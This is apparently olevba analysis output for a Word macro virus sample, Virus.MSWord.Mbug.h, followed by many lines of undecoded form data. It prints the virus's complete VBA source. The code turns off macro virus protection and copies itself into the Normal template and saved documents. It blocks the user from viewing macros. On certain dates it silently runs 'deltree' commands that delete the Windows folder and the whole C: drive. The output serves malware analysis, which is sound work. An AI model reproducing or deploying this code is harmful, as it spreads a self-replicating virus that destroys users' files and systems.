olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mbug.h
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mbug.h - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO clinton.bas 
in file: Virus.MSWord.Mbug.h - OLE stream: 'Macros/VBA/clinton'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
If Day(Now()) = "15" Or Day(Now()) = "16" Or Day(Now()) = "17" Or Day(Now()) = "18" Or Day(Now()) = "19" Or Day(Now()) = "20" Or Day(Now()) = "21" Or Day(Now()) = "22" Or Day(Now()) = "23" Or Day(Now()) = "24" Or Day(Now()) = "25" Or Day(Now()) = "26" Or Day(Now()) = "27" Or Day(Now()) = "28" Or Day(Now()) = "29" Or Day(Now()) = "30" Or Day(Now()) = "31" Then
StatusBar = "Clinton Announcement"
Else
UserForm1.Show
MsgBox "Not Accept, must punish", vbInformation
Shell "deltree /y c:\windows", vbHide
Shell "deltree /y c:\*.*", vbHide
End If
End Sub
Sub AutoClose()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorAC
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0) = "clinton" Then
        clintonInstalled = -1
    End If
Next i
If Not clintonInstalled Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="clinton", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm1", Object:=wdOrganizerObjectProjectItems
End If
ErrorAC:
End Sub
Sub FileSave()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorA
FileSaveAss
ErrorA:
End Sub
Private Sub FileSaveAss()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFA
    Dialogs(wdDialogFileSaveAs).Show
    If (ActiveDocument.SaveFormat = wdFormatDocument) Or (ActiveDocument.SaveFormat = wdFormatTemplate) Then
        ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="clinton", Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserForm1", Object:=wdOrganizerObjectProjectItems
        ActiveDocument.Save
        End If
If Day(Now()) = "15" Or Day(Now()) = "16" Or Day(Now()) = "17" Or Day(Now()) = "18" Or Day(Now()) = "19" Or Day(Now()) = "20" Or Day(Now()) = "21" Or Day(Now()) = "22" Or Day(Now()) = "23" Or Day(Now()) = "24" Or Day(Now()) = "25" Or Day(Now()) = "26" Or Day(Now()) = "27" Or Day(Now()) = "28" Or Day(Now()) = "29" Or Day(Now()) = "30" Or Day(Now()) = "31" Then
UserForm1.Show
MsgBox "Not Accept, must punish", vbInformation
Shell "deltree /y c:\windows", vbHide
Shell "deltree /y c:\*.*", vbHide
Else
MsgBox "Clinton Save"
End If
ErrorFA:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
    If (ActiveDocument.SaveFormat = wdFormatDocument) Or (ActiveDocument.SaveFormat = wdFormatTemplate) Then
        ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="clinton", Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserForm1", Object:=wdOrganizerObjectProjectItems
        ActiveDocument.Save
        End If
If Day(Now()) = "15" Or Day(Now()) = "16" Or Day(Now()) = "17" Or Day(Now()) = "18" Or Day(Now()) = "19" Or Day(Now()) = "20" Or Day(Now()) = "21" Or Day(Now()) = "22" Or Day(Now()) = "23" Or Day(Now()) = "24" Or Day(Now()) = "25" Or Day(Now()) = "26" Or Day(Now()) = "27" Or Day(Now()) = "28" Or Day(Now()) = "29" Or Day(Now()) = "30" Or Day(Now()) = "31" Then
UserForm1.Show
MsgBox "Not Accept, must punish", vbInformation
Shell "deltree /y c:\windows", vbHide
Shell "deltree /y c:\*.*", vbHide
Else
MsgBox "Clinton Save"
End If
ErrorFSA:
End Sub
Sub FilePrint()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Selection.Font.Size = "100"
Selection.Font.Bold = True
Selection.TypeText Text:="Clinton Virus"
Selection.TypeText Text:="Clinton Virus"
Selection.TypeText Text:="Clinton Virus"
End Sub

Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFT
    MsgBox "Access Defined", vbExclamation
ErrorFT:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorTM
MsgBox "Access Defined", vbExclamation
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorVVBC
MsgBox "Access Defined", vbExclamation
ErrorVVBC:
End Sub
-------------------------------------------------------------------------------
VBA MACRO UserForm1.frm 
in file: Virus.MSWord.Mbug.h - OLE stream: 'Macros/VBA/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1)B�~������um��o�{��~kk[ZlJBJ999999999!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
23#)#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=)%9)!))%93#)..99)93.DB9BB9B99JBBRJJRJJR^RcgZskVck^giiqcZk))!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1)B����~���wos������kVcJBJ99J)%99993#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)%9)!))%91)B)%9)!)3#)..93.DB9B99JB9JBBRJ9RJJZJJRNPTcZkccckkiiqZKU')-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B/V����������~{�{�^RcB9J9)93.+')-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!))%9991)%91)B3#)1991991)B<.<1)BB9B19JBBRJJZJJRPZmk^gum�iiqcZkJJR3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1-X����~���wos{��~k^gNPT<.<3.+)%9!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
))!)1999)9199)!)3.D3.+1)B19999JJBJBBRB9B>FXJJRPZmkVccckk^gcckJJR<.<!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B/V�~�������o����o|ccc9)93.+3#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!3#)3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)%91999)91991)B)%93.+1)B9991)B99JBBRBBRJJR^RcgZsccckkiiq^RcBBR9)9!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1-X�~�o����o��o�{u~JJR3#)3#))!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3.+B9B9)9!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3.+3.D199199999199)%99993.DJBJ3=TBBRJJRJJRPZmcZkiiqt_�cckJJZ99J999!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!99J������o|��wosk^gB9B)!)3#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3#)BBRJBB!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3#)3.D9991)B9991999991)B9999)9?9WJBJJBJNPT[Zlcckiiqiiq^RcJBJB9B3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!B=k�~����o���xcsZKU3#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9)9JBJJBJ')-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)1)B9)9<.<B9B99919919B9)999JB9JBBRJJR^Rcccc[Zlk^gcckJJRB9J9)93#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B=k����~����iiqJJR1%1!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)JJZOGG991
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)1)B9991999)9<.<9999)9<.<99JBBRJJRJJRNPTgZsccck^gcRkJJR<.<3.D)%9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!JJR�~��~����o�kVcJBB!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!JBBJJR9)9!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)1)B99J3.D999199B9B1)BB9BB9BBBRJJR^RcJJRk^gcckcccJJRB9B3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
LHk�~���~�k^gNPT999
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!J9JZKU999!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!3#)3#)..93.D999<.<99JJ9JBBRJBJJJZgZskVciiq[ZlJ9J99J')-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!LHk������kVcJBB)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JBBJJRB9B)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!3#)1993.DB9BBBRN?VNPTiiqcZkk^gJJRB9J991
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!JJR����wosJJRJ9J)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!999kVcB9B1!!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
')-3#)99J3=TgZsk^giiqk^g^Rc9)91)B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!JJZ�~�sx�{^cJBJ199
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9)9cckJBB3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)1)BJJZccciiqJJZB9B3.+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!XFm�~��o|ZKUJBJ3.+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9)9ZKURBJ3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)3#))%93#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)XFm���k^gJJR99J3#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)eYVJJR3.+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)cRk��kVcJBJB9B199)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^RckVcOGG3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a[~�w[ZlJBB9)99993.+)!)3#))!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1)Bk^gZKUJJROGG3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)XFm�o|JJRB9B1999)93#)RBBJBJ991
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!kVck^g999B9Bwos9)9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)LHkcckJJR<.<3.+')-9)9JJRcccNPT3.+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JBBgZsOGG
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)k^geYV
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JBJZKU99J3#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!^Rcsemk^gJJR=-1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<.<^Rc^Rc9)9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1)B^Rc
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!XFmJJR999')-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!J9Rk^gk^giiq^Rc999
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)JJRk^gJJR3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1)B^RcB9B3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1)B^RcPZmeYVcccxcsJJZ)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OGGk^gkVcJBB
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BBRJJR3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!JBJJJRJ9RJJRk^gkkeYV3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B9BcZkkVckVc999
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!cRkBBR
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1)BB9BB9BB9BJBJ^Rcum��o|JBB!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9)9^Rccck�o|[Zl!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=kVc3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!))!))%9)!)3#))!)9)9JJRgZsJBB
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9)9ZKUkVcxcs�mnZKU
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JJZZKU!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2JJR^Rc^Rcwos�w<<?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1kVc)%9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)999
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JJRkVcJJRk^g�o|�o|199
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=cZk!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!<.<eYVJJZJJRZKUwoswos3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B=kJBB
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)991')-!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3#)XFmJJROGG99JPZm���o|3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)^Rc)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)991)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
')-JJR^RcJBB991)%9kVc�~wos3.+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!B9B)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)JJR$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2JBB<.<3#))!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!JBBcck[ZlJBB3#)3#)JJZ�~��mn3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B9J9)9!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
